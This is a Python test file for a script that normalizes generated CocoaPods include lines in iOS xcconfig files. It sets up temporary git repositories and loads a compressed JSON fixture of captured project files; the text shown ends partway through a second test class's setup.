import importlib.util
import base64
import json
from pathlib import Path
import subprocess
import tempfile
import unittest
import uuid
import zlib

# Compressed UTF-8 JSON, not executable data. Captured from the actual macOS
# CocoaPods integration; embeds original/current bytes of the four files so CI
# needs neither the local outputs directory nor historical Git commits.
CAPTURED_FIXTURE_B64 = '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'

spec = importlib.util.spec_from_file_location('ios_config', Path(__file__).resolve().parents[1] / 'normalize_ios_generated_config.py')
ios_config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ios_config)

class GeneratedConfigTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.git('init', '-q')
        self.git('config', 'core.autocrlf', 'false')
        for name in (*ios_config.INCLUDES, 'lib/main.dart'):
            p = self.root / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(b'#include "Generated.xcconfig"\n' if name.endswith('.xcconfig') else b'original\n')
        self.git('add', '.')
        self.git('-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid', 'commit', '-qm', 'fixture')

    def git(self, *args):
        return subprocess.check_output(['git', '-c', 'core.autocrlf=false', '-C', str(self.root), *args], stderr=subprocess.DEVNULL)

    def test_known_generated_includes_restore_original_without_touching_build(self):
        for name, include in ios_config.INCLUDES.items():
            p = self.root / name
            p.write_bytes(include + b'\n' + p.read_bytes())
        binary = self.root / 'build/Runner.app/Runner'
        binary.parent.mkdir(parents=True)
        binary.write_bytes(b'built-bundle')
        self.assertEqual(set(ios_config.normalize(self.root)), set(ios_config.INCLUDES))
        self.assertEqual(binary.read_bytes(), b'built-bundle')
        self.assertFalse(self.git('diff', 'HEAD').strip())

    def test_unexpected_source_changes_stop_without_reverting_them(self):
        p = self.root / 'lib/main.dart'
        p.write_bytes(b'changed\n')
        with self.assertRaises(ValueError):
            ios_config.normalize(self.root)
        self.assertEqual(p.read_bytes(), b'changed\n')

    def test_other_xcconfig_edits_stop_before_any_restoration(self):
        first, second = ios_config.INCLUDES
        for name, include in ios_config.INCLUDES.items():
            p = self.root / name
            p.write_bytes(include + b'\n' + p.read_bytes())
        with (self.root / second).open('ab') as out:
            out.write(b'OTHER_SETTING = altered\n')
        before = (self.root / first).read_bytes()
        with self.assertRaises(ValueError):
            ios_config.normalize(self.root)
        self.assertEqual((self.root / first).read_bytes(), before)

def captured_files():
    return json.loads(zlib.decompress(base64.b64decode(CAPTURED_FIXTURE_B64)))


def project_bytes(value):
    """Independent all-quoted OpenStep fixture serialization, never evaluation."""
    def emit(item):
        if isinstance(item, dict):
            return '{' + ''.join(json.dumps(k) + '=' + emit(v) + ';' for k, v in item.items()) + '}'
        if isinstance(item, list):
            return '(' + ','.join(emit(v) for v in item) + ')'
        return json.dumps(item, ensure_ascii=False)
    return emit(value).encode('utf-8')


class ActualCocoaPodsTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.data = captured_files()
        self.git('init', '-q')
        self.git('config', 'core.autocrlf', 'false')
        for name, values in self.data.items():
            path = self.root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(values['original'].encode('utf-8'))
        path = self.root / 'lib/main.dart'
        path.parent.mkdir()
        path.write_bytes(b'original Dart source\n')
